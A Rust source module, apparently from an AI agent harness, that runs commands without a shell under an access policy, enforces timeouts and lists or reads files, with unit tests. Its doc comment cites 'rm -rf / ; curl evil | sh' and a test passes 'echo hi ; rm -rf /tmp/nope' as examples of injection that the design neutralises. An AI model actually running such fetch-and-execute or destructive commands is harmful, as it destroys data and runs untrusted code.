//! Running commands and reading the filesystem, with policy checks.
//!
//! Every function here consults [`AccessManager`] before it touches anything.
//! A command is split into an argv and handed to the OS directly — there is no
//! shell, so `rm -rf / ; curl evil | sh` is one program named `rm` with a
//! nonsensical argument list rather than three commands, and the policy sees
//! the whole string it was asked about.

use std::io::Read;
use std::path::Path;
use std::process::{Child, Command, Output, Stdio};
use std::time::{Duration, Instant};

#[cfg(unix)]
use std::{io, os::fd::AsRawFd, os::unix::process::CommandExt};

use crate::access::AccessManager;
use crate::error::{Error, Result};

/// The default wall-clock ceiling on one command.
pub const DEFAULT_TIMEOUT: Duration = Duration::from_secs(60);

/// How often a running child is checked against its deadline.
///
/// Short enough that a timeout is not visibly late, long enough that a
/// long-running command does not spend the session's CPU on polling.
const POLL_INTERVAL: Duration = Duration::from_millis(5);

/// Run *command* and return its stdout.
///
/// A non-zero exit is an error carrying stderr, because a model that is handed
/// empty output and told nothing went wrong will report success.
pub fn run_command(
    access: &AccessManager,
    command: &str,
    cwd: Option<&Path>,
    timeout: Option<Duration>,
    actor: &str,
) -> Result<String> {
    run_command_cancellable(access, command, cwd, timeout, actor, &|| false)
}

pub(crate) fn run_command_cancellable(
    access: &AccessManager,
    command: &str,
    cwd: Option<&Path>,
    timeout: Option<Duration>,
    actor: &str,
    cancelled: &dyn Fn() -> bool,
) -> Result<String> {
    if cancelled() {
        return Err(Error::session("Command cancelled."));
    }
    let argv = shell_words::split(command)
        .map_err(|err| Error::session(format!("Invalid command syntax: {err}")))?;
    // A command that is only a comment or only whitespace splits to nothing,
    // while still being non-empty for the policy's own empty-command check.
    let Some((program, args)) = argv.split_first() else {
        return Err(Error::session(format!(
            "Command has no program to run: {command}"
        )));
    };
    access.check_command(command, actor)?;

    let mut builder = Command::new(program);
    builder
        .args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    if let Some(cwd) = cwd {
        builder.current_dir(cwd);
    }
    #[cfg(unix)]
    builder.process_group(0);

    let child = builder
        .spawn()
        .map_err(|err| Error::session(format!("Command failed: {command}: {err}")))?;
    let output = capture_output(child, timeout, cancelled)
        .map_err(|err| Error::session(format!("Command failed: {command}: {err}")))?
        .ok_or_else(|| Error::session(format!("Command timed out: {command}")))?;

    let stdout = decode(output.stdout);
    let stderr = decode(output.stderr);

    if !output.status.success() {
        let code = output.status.code().unwrap_or(-1);
        let mut message = format!("Command failed (exit {code}): {command}");
        let trailer = stderr.trim();
        if !trailer.is_empty() {
            message.push('\n');
            message.push_str(trailer);
        }
        return Err(Error::session(message));
    }
    Ok(stdout)
}

/// Collect both pipes without letting a full pipe or a surviving descendant
/// hide the deadline. The caller distinguishes timeout (`None`) from IO errors.
#[cfg(unix)]
fn capture_output(
    mut child: Child,
    timeout: Option<Duration>,
    cancelled: &dyn Fn() -> bool,
) -> Result<Option<Output>> {
    let started = Instant::now();
    let mut stdout = child.stdout.take().expect("stdout was piped");
    let mut stderr = child.stderr.take().expect("stderr was piped");
    let outcome = (|| {
        nonblocking(&stdout)?;
        nonblocking(&stderr)?;
        let mut out = Vec::new();
        let mut err = Vec::new();
        let mut out_open = true;
        let mut err_open = true;
        loop {
            if cancelled() {
                return Err(Error::session("Command cancelled."));
            }
            // One bounded read per pipe: continuous output must not postpone
            // the deadline check or starve the other pipe.
            let out_progress = read_pipe(&mut stdout, &mut out, &mut out_open)?;
            let err_progress = read_pipe(&mut stderr, &mut err, &mut err_open)?;
            if !out_open && !err_open {
                // Leave the leader unreaped while descendants hold its pipes.
                // Its PID then cannot be reused as another process group's ID
                // before timeout cleanup signals the group we created.
                if let Some(status) = child.try_wait().map_err(|err| Error::Io(err.to_string()))? {
                    return Ok(Some(Output {
                        status,
                        stdout: out,
                        stderr: err,
                    }));
                }
            }
            if timeout.is_some_and(|timeout| started.elapsed() >= timeout) {
                return Ok(None);
            }
            if !out_progress && !err_progress {
                std::thread::sleep(POLL_INTERVAL);
            }
        }
    })();
    if !matches!(&outcome, Ok(Some(_))) {
        // Cleanup also covers a failed pipe setup, read, or wait. Closing our
        // pipe ends never waits for EOF, even if a daemon left the group.
        stop_group(&mut child)?;
    }
    outcome
}

#[cfg(unix)]
fn nonblocking(pipe: &impl AsRawFd) -> Result<()> {
    let fd = pipe.as_raw_fd();
    // SAFETY: `pipe` owns a live descriptor for both calls. These fcntl
    // commands access descriptor flags and take no pointer arguments.
    let flags = unsafe { libc::fcntl(fd, libc::F_GETFL) };
    if flags == -1 {
        return Err(Error::Io(io::Error::last_os_error().to_string()));
    }
    if unsafe { libc::fcntl(fd, libc::F_SETFL, flags | libc::O_NONBLOCK) } == -1 {
        return Err(Error::Io(io::Error::last_os_error().to_string()));
    }
    Ok(())
}

#[cfg(unix)]
fn read_pipe(pipe: &mut impl Read, bytes: &mut Vec<u8>, open: &mut bool) -> Result<bool> {
    if !*open {
        return Ok(false);
    }
    let mut buffer = [0; 8192];
    match pipe.read(&mut buffer) {
        Ok(0) => {
            *open = false;
            Ok(false)
        }
        Ok(count) => {
            bytes.extend_from_slice(&buffer[..count]);
            Ok(true)
        }
        Err(err)
            if matches!(
                err.kind(),
                io::ErrorKind::WouldBlock | io::ErrorKind::Interrupted
            ) =>
        {
            Ok(false)
        }
        Err(err) => Err(Error::Io(err.to_string())),
    }
}

#[cfg(unix)]
fn stop_group(child: &mut Child) -> Result<()> {
    // SAFETY: process_group(0) made the child's positive PID its group ID, and
    // capture_output has not reaped it. A negative PID targets only that group.
    let killed = unsafe { libc::kill(-(child.id() as libc::pid_t), libc::SIGKILL) };
    let group_error = (killed == -1).then(io::Error::last_os_error);
    // The leader can move groups while leaving descendants in the original
    // one. A successful group signal therefore still needs direct-child cleanup.
    let _ = child.kill();
    let waited = child.wait();
    if let Some(err) = group_error.filter(|err| err.raw_os_error() != Some(libc::ESRCH)) {
        return Err(Error::Io(err.to_string()));
    }
    waited.map(|_| ()).map_err(|err| Error::Io(err.to_string()))
}

/// Other platforms retain direct-child timeout semantics. The access boundary
/// and process-group cleanup are supported on POSIX systems.
#[cfg(not(unix))]
fn capture_output(
    mut child: Child,
    timeout: Option<Duration>,
    cancelled: &dyn Fn() -> bool,
) -> Result<Option<Output>> {
    let mut stdout = child.stdout.take().expect("stdout was piped");
    let mut stderr = child.stderr.take().expect("stderr was piped");
    let out_reader = std::thread::spawn(move || {
        let mut buffer = Vec::new();
        let _ = stdout.read_to_end(&mut buffer);
        buffer
    });
    let err_reader = std::thread::spawn(move || {
        let mut buffer = Vec::new();
        let _ = stderr.read_to_end(&mut buffer);
        buffer
    });

    let deadline = timeout.map(|timeout| Instant::now() + timeout);
    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break status,
            Ok(None) => {}
            Err(err) => {
                let _ = child.kill();
                let _ = child.wait();
                let _ = out_reader.join();
                let _ = err_reader.join();
                return Err(Error::Io(err.to_string()));
            }
        }
        if cancelled() || deadline.is_some_and(|deadline| Instant::now() >= deadline) {
            let _ = child.kill();
            let _ = child.wait();
            let _ = out_reader.join();
            let _ = err_reader.join();
            return Ok(None);
        }
        std::thread::sleep(POLL_INTERVAL);
    };

    Ok(Some(Output {
        status,
        stdout: out_reader.join().unwrap_or_default(),
        stderr: err_reader.join().unwrap_or_default(),
    }))
}

/// Read a file the policy permits.
pub fn read_file(access: &AccessManager, path: &str, actor: &str) -> Result<String> {
    let resolved = access.check_path("read", path, actor)?;
    std::fs::read_to_string(&resolved)
        .map_err(|err| Error::Io(format!("{}: {err}", resolved.display())))
}

/// List a directory the policy permits, sorted by name.
pub fn list_dir(access: &AccessManager, path: &str, actor: &str) -> Result<Vec<String>> {
    let resolved = access.check_path("list", path, actor)?;
    if !resolved.is_dir() {
        return Err(Error::session(format!(
            "Not a directory: {}",
            resolved.display()
        )));
    }
    let entries = std::fs::read_dir(&resolved)
        .map_err(|err| Error::Io(format!("{}: {err}", resolved.display())))?;
    let mut names: Vec<String> = entries
        .filter_map(|entry| Some(entry.ok()?.file_name().to_string_lossy().into_owned()))
        .collect();
    names.sort();
    Ok(names)
}

/// Child output as text, the way `subprocess.run(text=True)` would decode it.
fn decode(bytes: Vec<u8>) -> String {
    String::from_utf8_lossy(&bytes).into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::access::AccessPolicy;
    use crate::testing::TempDir;

    fn allowing(configure: impl FnOnce(&mut AccessPolicy)) -> AccessManager {
        let mut policy = AccessPolicy::new();
        configure(&mut policy);
        AccessManager::new(policy)
    }

    #[test]
    fn an_allowed_command_returns_its_stdout() {
        let access = allowing(|policy| policy.allowed_commands = vec!["echo *".into()]);
        let out = run_command(&access, "echo hello", None, None, "").expect("runs");
        assert_eq!(out, "hello\n");
    }

    #[test]
    fn the_policy_is_consulted_before_anything_is_spawned() {
        let error = run_command(&AccessManager::default(), "echo hi", None, None, "")
            .expect_err("default denies");
        assert!(matches!(error, Error::AccessDenied(_)), "{error:?}");
    }

    #[test]
    fn a_failing_command_reports_its_code_and_stderr() {
        let access = allowing(|policy| policy.allowed_commands = vec!["sh *".into()]);
        let error = run_command(&access, "sh -c 'echo boom >&2; exit 3'", None, None, "")
            .expect_err("exit 3");
        let message = error.to_string();
        assert!(message.contains("(exit 3)"), "{message}");
        assert!(message.contains("boom"), "{message}");
    }

    #[test]
    fn there_is_no_shell_so_metacharacters_are_arguments() {
        // `echo hi; rm -rf /` is one program named `echo` with `;` and `rm` as
        // arguments — the semicolon never separates anything.
        let access = allowing(|policy| policy.allowed_commands = vec!["echo *".into()]);
        let out = run_command(&access, "echo hi ; rm -rf /tmp/nope", None, None, "").expect("runs");
        assert_eq!(out, "hi ; rm -rf /tmp/nope\n");
    }

    #[test]
    fn unbalanced_quoting_is_refused_before_the_policy_check() {
        let access = allowing(|policy| policy.allowed_command_patterns = vec!["*".into()]);
        let error = run_command(&access, "echo 'unclosed", None, None, "").expect_err("bad syntax");
        assert!(
            error.to_string().contains("Invalid command syntax"),
            "{error}"
        );
    }

    #[test]
    fn a_command_that_splits_to_no_program_is_refused_rather_than_panicking() {
        // `"*"` admits the string, so the guard in `run_command` is the only
        // thing standing between these and an index into an empty argv.
        let access = allowing(|policy| policy.allowed_commands = vec!["*".into()]);
        for command in ["#comment", "  # spaced", "\t"] {
            let error = run_command(&access, command, None, None, "").expect_err("no program");
            assert!(
                error.to_string().contains("Command has no program to run"),
                "{command:?}: {error}"
            );
        }
    }

    #[test]
    fn a_command_that_overruns_its_deadline_is_killed() {
        #[cfg(unix)]
        if std::env::var_os("KERNESS_EXEC_TEST_MOVE_GROUP").is_some() {
            // This branch runs only in a fresh copy of the test executable.
            // SAFETY: the fork child makes only async-signal-safe libc calls
            // before _exit; it never touches the test runner's inherited locks.
            unsafe {
                match libc::fork() {
                    -1 => libc::_exit(10),
                    0 => {
                        libc::sleep(2);
                        libc::_exit(0);
                    }
                    _ => {}
                }
                // Keep the descendant in the original group while the direct
                // child joins our parent's group. Killing the former succeeds
                // without terminating the latter.
                if libc::setpgid(0, libc::getpgid(libc::getppid())) == -1 {
                    libc::_exit(11);
                }
                libc::sleep(2);
                libc::_exit(0);
            }
        }
        let access = allowing(|policy| {
            policy.allowed_commands = vec!["sleep *".into(), "sh *".into(), "env *".into()]
        });
        // Finite sleepers leave nothing running if the deadline regresses.
        // Both shell cases leave a descendant holding the output pipes: one
        // while the leader waits and one after the leader has already exited.
        let commands = [
            "sleep 2".to_string(),
            "sh -c 'sleep 2 & wait'".to_string(),
            "sh -c 'sleep 2 &'".to_string(),
        ];
        #[cfg(unix)]
        let commands = {
            let mut commands = commands.to_vec();
            commands.push(format!(
                "env KERNESS_EXEC_TEST_MOVE_GROUP=1 {} --exact \
                 exec::tests::a_command_that_overruns_its_deadline_is_killed",
                shell_words::quote(
                    std::env::current_exe()
                        .expect("test executable")
                        .to_str()
                        .expect("path")
                )
            ));
            commands
        };
        for command in commands {
            let started = Instant::now();
            let error = run_command(
                &access,
                &command,
                None,
                Some(Duration::from_millis(100)),
                "",
            )
            .expect_err("timed out");
            assert!(error.to_string().contains("Command timed out"), "{error}");
            assert!(
                started.elapsed() < Duration::from_secs(1),
                "{command} exceeded its deadline: {:?}",
                started.elapsed()
            );
        }
    }

    #[test]
    fn output_larger_than_a_pipe_buffer_still_completes() {
        // Both pipes must be drained while the command runs. Either one can
        // fill before the child exits, and the final bytes must survive EOF.
        let access = allowing(|policy| policy.allowed_commands = vec!["sh *".into()]);
        let out = run_command(
            &access,
            "sh -c '(yes abcdefgh | head -n 100000) & yes ignored | head -n 100000 >&2; wait'",
            None,
            Some(Duration::from_secs(30)),
            "",
        )
        .expect("runs");
        assert_eq!(out, "abcdefgh\n".repeat(100_000));
    }

    #[test]
    fn cwd_is_where_the_command_runs() {
        let dir = TempDir::resolved("cwd");
        let access = allowing(|policy| policy.allowed_commands = vec!["pwd".into()]);
        let out = run_command(&access, "pwd", Some(&dir.0), None, "").expect("runs");
        assert_eq!(out.trim(), dir.text());
    }

    #[test]
    fn reads_and_listings_go_through_the_policy() {
        let dir = TempDir::resolved("fs");
        std::fs::write(dir.0.join("b.txt"), "contents").expect("write");
        std::fs::write(dir.0.join("a.txt"), "other").expect("write");

        let denied = AccessManager::default();
        assert!(read_file(&denied, &dir.0.join("b.txt").display().to_string(), "").is_err());
        assert!(list_dir(&denied, &dir.text(), "").is_err());

        let access = allowing(|policy| policy.allowed_dirs = vec![dir.text()]);
        assert_eq!(
            read_file(&access, &dir.0.join("b.txt").display().to_string(), "").expect("read"),
            "contents"
        );
        assert_eq!(
            list_dir(&access, &dir.text(), "").expect("list"),
            vec!["a.txt", "b.txt"],
            "entries come back sorted"
        );
    }

    #[test]
    fn listing_a_file_says_so_rather_than_returning_nothing() {
        let dir = TempDir::resolved("notadir");
        let file = dir.0.join("a.txt");
        std::fs::write(&file, "x").expect("write");
        let access = allowing(|policy| policy.allowed_dirs = vec![dir.text()]);

        let error =
            list_dir(&access, &file.display().to_string(), "").expect_err("not a directory");
        assert!(
            error.to_string().starts_with("Not a directory: "),
            "{error}"
        );
    }
}
